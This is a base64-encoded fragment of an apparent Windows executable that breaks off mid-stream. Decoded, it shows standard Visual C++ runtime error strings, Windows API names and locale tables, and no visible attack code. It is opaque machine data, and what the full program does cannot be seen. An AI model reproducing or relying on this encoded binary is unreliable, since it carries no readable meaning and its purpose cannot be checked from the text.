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QAKAApACAAaABhAHMAIABiAGUAZQBuACAAYwBhAGwAbABlAGQADQAKAAAAAAAAAAAAAAAAAFIANgAwADEANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAZABhAHQAYQANAAoAAAAAAAAAAAAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAAAAAAAAAAAAUgA2ADAAMQA5AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABvAHAAZQBuACAAYwBvAG4AcwBvAGwAZQAgAGQAZQB2AGkAYwBlAA0ACgAAAAAAAAAAAAAAAAAAAAAAUgA2ADAAMgA0AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAHgAaQB0ACAAdABhAGIAbABlAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAAAAAAFIANgAwADMAMAANAAoALQAgAEMAUgBUACAAbgBvAHQAIABpAG4AaQB0AGkAYQBsAGkAegBlAGQADQAKAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMwANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIAB1AHMAZQAgAE0AUwBJAEwAIABjAG8AZABlACAAZgByAG8AbQAgAHQAaABpAHMAIABhAHMAcwBlAG0AYgBsAHkAIABkAHUAcgBpAG4AZwAgAG4AYQB0AGkAdgBlACAAYwBvAGQAZQAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgAgAEkAdAAgAGkAcwAgAG0AbwBzAHQAIABsAGkAawBlAGwAeQAgAHQAaABlACAAcgBlAHMAdQBsAHQAIABvAGYAIABjAGEAbABsAGkAbgBnACAAYQBuACAATQBTAEkATAAtAGMAbwBtAHAAaQBsAGUAZAAgACgALwBjAGwAcgApACAAZgB1AG4AYwB0AGkAbwBuACAAZgByAG8AbQAgAGEAIABuAGEAdABpAHYAZQAgAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAgAG8AcgAgAGYAcgBvAG0AIABEAGwAbABNAGEAaQBuAC4ADQAKAAAAAABSAD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AAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAACAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAAAAAAAAAAACAgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWnt8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8BAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/AAEAAAAAAAAAgC0BQAEAAAACAAAAAAAAAIgtAUABAAAAAwAAAAAAAACQLQFAAQAAAAQAAAAAAAAAmC0BQAEAAAAFAAAAAAAAAKgtAUABAAAABgAAAAAAAACwLQFAAQAAAAcAAAAAAAAAuC0BQAEAAAAIAAAAAAAAAMAtAUABAAAACQAAAAAAAADILQFAAQAAAAoAAAAAAAAA0C0BQAEAAAALAAAAAAAAANgtAUABAAAADAAAAAAAAADgLQFAAQAAAA0AAAAAAAAA6C0BQAEAAAAOAAAAAAAAAPAtAUABAAAADwAAAAAAAAD4LQFAAQAAABAAAAAAAAAAAC4BQAEAAAARAAAAAAAAAAguAUABAAAAEgAAAAAAAAAQLgFAAQAAABMAAAAAAAAAGC4BQAEAAAAUAAAAAAAAACAuAUABAAAAFQAAAAAAAAAoLgFAAQAAABYAAAAAAAAAMC4BQAEAAAAYAAAAAAAAADguAUABAAAAGQAAAAAAAABALgFAAQAAABoAAAAAAAAASC4BQAEAAAAbAAAAAAAAAFAuAUABAAAAHAAAAAAAAABYLgFAAQAAAB0AAAAAAAAAYC4BQAEAAAAeAAAAAAAAAGguAUABAAAAHwAAAAAAAABwLgFAAQAAACAAAAAAAAAAeC4BQAEAAAAhAAAAAAAAAIAuAUABAAAAIgAAAAAAAACILgFAAQAAACMAAAAAAAAAkC4BQAEAAAAkAAAAAAAAAJguAUABAAAAJQAAAAAAAACgLgFAAQAAACYAAAAAAAAAqC4BQAEAAAAnAAAAAAAAALAuAUABAAAAKQAAAAAAAAC4LgFAAQAAACoAAAAAAAAAwC4BQAEAAAArAAAAAAAAAMguAUABAAAALAAAAAAAAADQLgFAAQAAAC0AAAAAAAAA2C4BQAEAAAAvAAAAAAAAAOAuAUABAAAANgAAAAAAAADoLgFAAQAAADcAAAAAAAAA8C4BQAEAAAA4AAAAAAAAAPguAUABAAAAOQAAAAAAAAAALwFAAQAAAD4AAAAAAAAACC8BQAEAAAA/AAAAAAAAABAvAUABAAAAQAAAAAAAAAAYLwFAAQAAAEEAAAAAAAAAIC8BQAEAAABDAAAAAAAAACgvAUABAAAARAAAAAAAAAAwLwFAAQAAAEYAAAAAAAAAOC8BQAEAAABHAAAAAAAAAEAvAUABAAAASQAAAAAAAABILwFAAQAAAEoAAAAAAAAAUC8BQAEAAABLAAAAAAAAAFgvAUABAAAATgAAAAAAAABgLwFAAQAAAE8AAAAAAAAAaC8BQAEAAABQAAAAAAAAAHAvAUABAAAAVgAAAAAAAAB4LwFAAQAAAFcAAAAAAAAAgC8BQAEAAABaAAAAAAAAAIgvAUABAAAAZQAAAAAAAACQLwFAAQAAAH8AAAAAAAAAmC8BQAEAAAABBAAAAAAAAKAvAUABAAAAAgQAAAAAAACwLwFAAQAAAAMEAAAAAAAAwC8BQAEAAAAEBAAAAAAAABgEAUABAAAABQQAAAAAAADQLwFAAQAAAAYEAAAAAAAA4C8BQAEAAAAHBAAAAAAAAPAvAUABAAAACAQAAAAAAAAAMAFAAQAAAAkEAAAAAAAA0AcBQAEAAAALBAAAAAAAABAwAUABAAAADAQAAAAAAAAgMAFAAQAAAA0EAAAAAAAAMDABQAEAAAAOBAAAAAAAAEAwAUABAAAADwQAAAAAAABQMAFAAQAAABAEAAAAAAAAYDABQAEAAAARBAAAAAAAAOgDAUABAAAAEgQAAAAAAAAIBAFAAQAAABMEAAAAAAAAcDABQAEAAAAUBAAAAAAAAIAwAUABAAAAFQQAAAAAAACQMAFAAQAAABYEAAAAAAAAoDABQAEAAAAYBAAAAAAAALAwAUABAAAAGQQAAAAAAADAMAFAAQAAABoEAAAAAAAA0DABQAEAAAAbBAAAAAAAAOAwAUABAAAAHAQAAAAAAADwMAFAAQAAAB0EAAAAAAAAADEBQAEAAAAeBAAAAAAAABAxAUABAAAAHwQAAAAAAAAgMQFAAQAAACAEAAAAAAAAMDEBQAEAAAAhBAAAAAAAAEAxAUABAAAAIgQAAAAAAABQMQFAAQAAACMEAAAAAAAAYDEBQAEAAAAkBAAAAAAAAHAxAUABAAAAJQQAAAAAAACAMQFAAQAAACYEAAAAAAAAkDEBQAEAAAAnBAAAAAAAAKAxAUABAAAAKQQAAAAAAACwMQFAAQAAACoEAAAAAAAAwDEBQAEAAAArBAAAAAAAANAxAUABAAAALAQAAAAAAADgMQFAAQAAAC0EAAAAAAAA+DEBQAEAAAAvBAAAAAAAAAgyAUABAAAAMgQAAAAAAAAYMgFAAQAAADQEAAAAAAAAKDIBQAEAAAA1BAAAAAAAADgyAUABAAAANgQAAAAAAABIMgFAAQAAADcEAAAAAAAAWDIBQAEAAAA4BAAAAAAAAGgyAUABAAAAOQQAAAAAAAB4MgFAAQAAADoEAAAAAAAAiDIBQAEAAAA7BAAAAAAAAJgyAUABAAAAPgQAAAAAAACoMgFAAQAAAD8EAAAAAAAAuDIBQAEAAABABAAAAAAAAMgyAUABAAAAQQQAAAAAAADYMgFAAQAAAEMEAAAAAAAA6DIBQAEAAABEBAAAAAAAAAAzAUABAAAARQQAAAAAAAAQMwFAAQAAAEYEAAAAAAAAIDMBQAEAAABHBAAAAAAAADAzAUABAAAASQQAAAAAAABAMwFAAQAAAEoEAAAAAAAAUDMBQAEAAABLBAAAAAAAAGAzAUABAAAATAQAAAAAAABwMwFAAQAAAE4EAAAAAAAAgDMBQAEAAABPBAAAAAAAAJAzAUABAAAAUAQAAAAAAACgMwFAAQAAAFIEAAAAAAAAsDMBQAEAAABWBAAAAAAAAMAzAUABAAAAVwQAAAAAAADQMwFAAQAAAFoEAAAAAAAA4DMBQAEAAABlBAAAAAAAAPAzAUABAAAAawQAAAAAAAAANAFAAQAAAGwEAAAAAAAAEDQBQAEAAACBBAAAAAAAACA0AUABAAAAAQgAAAAAAAAwNAFAAQAAAAQIAAAAAAAA+AMBQAEAAAAHCAAAAAAAAEA0AUABAAAACQgAAAAAAABQNAFAAQAAAAoIAAAAAAAAYDQBQAEAAAAMCAAAAAAAAHA0AUABAAAAEAgAAAAAAACANAFAAQAAABMIAAAAAAAAkDQBQAEAAAAUCAAAAAAAAKA0AUABAAAAFggAAAAAAACwNAFAAQAAABoIAAAAAAAAwDQBQAEAAAAdCAAAAAAAANg0AUABAAAALAgAAAAAAADoNAFAAQAAADsIAAAAAAAAADUBQAEAAAA+CAAAAAAAABA1AUABAAAAQwgAAAAAAAAgNQFAAQAAAGsIAAAAAAAAODUBQAEAAAABDAAAAAAAAEg1AUABAAAABAwAAAAAAABYNQFAAQAAAAcMAAAAAAAAaDUBQAEAAAAJDAAAAAAAAHg1AUABAAAACgwAAAAAAACINQFAAQAAAAwMAAAAAAAAmDUBQAEAAAAaDAAAAAAAAKg1AUABAAAAOwwAAAAAAADANQFAAQAAAGsMAAAAAAAA0DUBQAEAAAABEAAAAAAAAOA1AUABAAAABBAAAAAAAADwNQFAAQAAAAcQAAAAAAAAADYBQAEAAAAJEAAAAAAAABA2AUABAAAAChAAAAAAAAAgNgFAAQAAAAwQAAAAAAAAMDYBQAEAAAAaEAAAAAAAAEA2AUABAAAAOxAAAAAAAABQNgFAAQAAAAEUAAAAAAAAYDYBQAEAAAAEFAAAAAAAAHA2AUABAAAABxQAAAAAAACANgFAAQAAAAkUAAAAAAAAkDYBQAEAAAAKFAAAAAAAAKA2AUABAAAADBQAAAAAAACwNgFAAQAAABoUAAAAAAAAwDYBQAEAAAA7FAAAAAAAANg2AUABAAAAARgAAAAAAADoNgFAAQAAAAkYAAAAAAAA+DYBQAEAAAAKGAAAAAAAAAg3AUABAAAADBgAAAAAAAAYNwFAAQAAABoYAAAAAAAAKDcBQAEAAAA7GAAAAAAAAEA3AUABAAAAARwAAAAAAABQNwFAAQAAAAkcAAAAAAAAYDcBQAEAAAAKHAAAAAAAAHA3AUABAAAAGhwAAAAAAACANwFAAQAAADscAAAAAAAAmDcBQAEAAAABIAAAAAAAAKg3AUABAAAACSAAAAAAAAC4NwFAAQAAAAogAAAAAAAAyDcBQAEAAAA7IAAAAAAAANg3AUABAAAAASQAAAAAAADoNwFAAQAAAAkkAAAAAAAA+DcBQAEAAAAKJAAAAAAAAAg4AUABAAAAOyQAAAAAAAAYOAFAAQAAAAEoAAAAAAAAKDgBQAEAAAAJKAAAAAAAADg4AUABAAAACigAAAAAAABIOAFAAQAAAAEsAAAAAAAAWDgBQAEAAAAJLAAAAAAAAGg4AUABAAAACiwAAAAAAAB4OAFAAQAAAAEwAAAAAAAAiDgBQAEAAAAJMAAAAAAAAJg4AUABAAAACjAAAAAAAACoOAFAAQAAAAE0AAAAAAAAuDgBQAEAAAAJNAAAAAAAAMg4AUABAAAACjQAAAAAAADYOAFAAQAAAAE4AAAAAAAA6DgBQAEAAAAKOAAAAAAAAPg4AUABAAAAATwAAAAAAAAIOQFAAQAAAAo8AAAAAAAAGDkBQAEAAAABQAAAAAAAACg5AUABAAAACkAAAAAAAAA4OQFAAQAAAApEAAAAAAAASDkBQAEAAAAKSAAAAAAAAFg5AUABAAAACkwAAAAAAABoOQFAAQAAAApQAAAAAAAAeDkBQAEAAAAEfAAAAAAAAIg5AUABAAAAGnwAAAAAAACYOQFAAQAAAJgvAUABAAAAQgAAAAAAAADoLgFAAQAAAC